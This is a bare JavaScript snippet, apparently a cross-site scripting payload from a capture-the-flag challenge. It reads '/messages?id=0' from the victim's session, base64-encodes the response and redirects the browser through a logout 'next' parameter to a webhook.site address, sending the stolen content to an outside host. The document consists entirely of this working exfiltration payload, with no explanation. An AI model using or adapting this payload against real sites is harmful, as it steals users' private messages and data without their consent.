fetch('/messages?id=0')
  .then(function(r) { return r.text(); })
  .then(function(data) {
    location = '/logout?next=https://webhook.site/e29717d0-ddb3-4301-85fa-834f8a8ba029?flag=' + btoa(data);
  });
